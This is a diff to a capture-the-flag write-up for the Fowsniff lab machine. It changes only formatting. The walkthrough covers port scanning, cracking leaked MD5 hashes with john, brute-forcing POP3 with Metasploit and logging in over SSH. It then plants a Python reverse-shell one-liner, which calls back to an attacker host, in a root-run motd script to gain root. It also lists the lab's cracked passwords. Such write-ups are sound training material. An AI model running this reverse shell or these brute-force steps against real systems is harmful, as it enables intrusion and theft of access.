@@ -11,7 +11,7 @@ pagination_prev: null
 &nbsp;
 
 ### Using nmap, scan this machine. What ports are open?
-- Let's perform a scan using `nmap`.
+Let's perform a scan using `nmap`.
 ```
 $ nmap -sC -sV 10.10.251.22
 Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-17 08:35 IST
@@ -53,7 +53,7 @@ There are four open ports:
 &nbsp;
 
 ### Using the information from the open ports. Look around. What can you find?
-- We can visit the target using our browser.
+We can visit the target using our browser.
 
 ![2](https://github.com/Knign/Write-ups/assets/110326359/41cd6256-ab6f-4190-af75-eaff51c69a6b)
 
@@ -62,7 +62,7 @@ There are four open ports:
 &nbsp;
 
 ### Using Google, can you find any public information about them?
-- On searching for a while, we can find this page which has a bunch of the employees' passwords.
+On searching for a while, we can find this page which has a bunch of the employees' passwords.
 
 ![3](https://github.com/Knign/Write-ups/assets/110326359/8395f86f-79bc-4b8e-baaa-df2608066737)
 
@@ -77,13 +77,13 @@ mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
 parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
 sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
 ```
-- However these passwords are hashed.
+However these passwords are hashed.
 ### No answer needed
 
 &nbsp;
 
 ### Can you decode these md5 hashes? You can even use sites like [hashkiller](https://hashkiller.io/listmanager) to decode them.
-- We can identify the hashes using `hash-identifier`.
+We can identify the hashes using `hash-identifier`.
 ```
 $ hash-identifier 8a28a94a588a95b80163709ab4313aa4                                                  
 --------------------------------------------------
@@ -92,8 +92,9 @@ Possible Hashs:
 [+] MD5
 [+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
 ```
-- Similar to the first one all the rest are hashed using MD5 algorithm.
-- Now let's save the hashes in a file and use `john` to crack them.
+Similar to the first one all the rest are hashed using MD5 algorithm.
+
+Now let's save the hashes in a file and use `john` to crack them.
 ```
 $ john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hashes
 $ john --format=Raw-MD5 --show hashes                                            
@@ -131,17 +132,18 @@ $ john --format=Raw-MD5 --show hashes
 | carp4ever  |
 | orlando12  |
 | 07011972           |
-- For some reason `john` could not crack the hash of sixth password.
+
+For some reason `john` could not crack the hash of sixth password.
 ### No answer needed
 
 &nbsp;
 
 ### Using the usernames and passwords you captured, can you use metasploit to brute force the pop3 login?
-- Let's create the database and run `msfconsole`.
+Let's create the database and run `msfconsole`.
 ```
 $ sudo msfdb run
 ```
-- We can now search for modules related to Pop3.
+We can now search for modules related to Pop3.
 ```
 msf6 > search pop3
 
@@ -158,12 +160,12 @@ Matching Modules
    5  post/windows/gather/credentials/outlook                        normal   No     Windows Gather Microsoft Outlook Saved Password Extraction
    6  exploit/windows/smtp/ypops_overflow1          2004-09-27       average  Yes    YPOPS 0.6 Buffer Overflow
 ```
-- We will be using the fourth module. Let's select it using the following command:
+We will be using the fourth module. Let's select it using the following command:
 ```
 msf6 > use 3
 msf6 auxiliary(scanner/pop3/pop3_login) > 
 ```
-- Let's set up the module.
+Let's set up the module.
 ```
 msf6 auxiliary(scanner/pop3/pop3_login) > set rhosts 10.10.251.22
 rhosts => 10.10.251.22
@@ -174,7 +176,7 @@ pass_file => passwords.txt
 msf6 auxiliary(scanner/pop3/pop3_login) > set verbose false
 verbose => false
 ```
-- We are now all set to brute force the login.
+We are now all set to brute force the login.
 ```
 msf6 auxiliary(scanner/pop3/pop3_login) > run
 
@@ -193,7 +195,7 @@ scoobydoo2
 &nbsp;
 
 ### Can you connect to the pop3 service with her credentials? What email information can you gather?
-- We can connect to the Pop3 service using `nc`.
+We can connect to the Pop3 service using `nc`.
 ```
 $ nc 10.10.251.22 110    
 +OK Welcome to the Fowsniff Corporate Mail Server!
@@ -207,7 +209,7 @@ pass scoobydoo2
 &nbsp;
 
 ### Looking through her emails, what was a temporary password set for her?
-- We can use the `list` command to list out the contents.
+We can use the `list` command to list out the contents.
 ```
 list
 +OK 2 messages:
@@ -215,7 +217,7 @@ list
 2 1280
 .
 ```
-- There are two messages. Let's read the first message using `retr`.
+There are two messages. Let's read the first message using `retr`.
 ```
 retr 1
 +OK 1622 octets
@@ -272,7 +274,7 @@ S1ck3nBluff+secureshell
 &nbsp;
 
 ### In the email, who send it? Using the password from the previous question and the senders username, connect to the machine using SSH.
-- Let's read the second message.
+Let's read the second message.
 ```
 ret 2
 -ERR Unknown command: RET
@@ -315,8 +317,9 @@ AJ had been telling us to do that right before Captain Profanity showed up.
 
 .
 ```
-- The email was sent by `baksteen` which we can see in the `From:` field.
-- Let's connect using SSH.
+The email was sent by `baksteen` which we can see in the `From:` field.
+
+Let's connect using SSH.
 ```
 $ ssh baksteen@10.10.251.22
 baksteen@10.10.251.22's password: 
@@ -352,13 +355,14 @@ baksteen@fowsniff:~$
 &nbsp;
 
 ### Once connected, what groups does this user belong to? Are there any interesting files that can be run by that group?
-- We can check which group the `baksteen` user belongs to using the following command:
+We can check which group the `baksteen` user belongs to using the following command:
 ```
 baksteen@fowsniff:~$ id
 uid=1004(baksteen) gid=100(users) groups=100(users),1001(baksteen)
 ```
-- As we can see `baksteen` belongs to the `users` group.
-- Now, let's find the files that can be run by the `users` group.
+As we can see `baksteen` belongs to the `users` group.
+
+Now, let's find the files that can be run by the `users` group.
 ```
 baksteen@fowsniff:~$ find / -group users -type f 2>/dev/null
 /opt/cube/cube.sh
@@ -368,7 +372,7 @@ baksteen@fowsniff:~$ find / -group users -type f 2>/dev/null
 &nbsp;
 
 ### Now you have found a file that can be edited by the group, can you edit it to include a reverse shell?
-- Let's check what the file does.
+Let's check what the file does.
 ```
 printf "
                             _____                       _  __  __  
@@ -385,7 +389,7 @@ printf "
 -: -odMMMMMMMMMMmhhdy/.    
 .ohdddddddddddddho:                  Delivering Solutions\n\n"
 ```
-- We can include the reverse shell that was provided to us with a few modifications:
+We can include the reverse shell that was provided to us with a few modifications:
 ```
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.17.48.138",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
@@ -394,16 +398,16 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 &nbsp;
 
 ### If you have not found out already, this file is run as root when a user connects to the machine using SSH. We know this as when we first connect we can see we get given a banner (with fowsniff corp). Look in **/etc/update-motd.d/** file. If (after we have put our reverse shell in the cube file) we then include this file in the motd.d file, it will run as root and we will get a reverse shell as root!
-- Let's start a `nc` listener on port 9999.
+Let's start a `nc` listener on port 9999.
 ```
 $ nc -nlvp 9999
 listening on [any] 9999 ...
 ```
-- Let's login again using SSH.
+Let's login again using SSH.
 ```
 ssh baksteen@10.10.251.22
 ```
-- If we check back on our listener, we will find that we have a reverse shell as `root`.
+If we check back on our listener, we will find that we have a reverse shell as `root`.
 ```
 $ nc -nlvp 9999
 listening on [any] 9999 ...
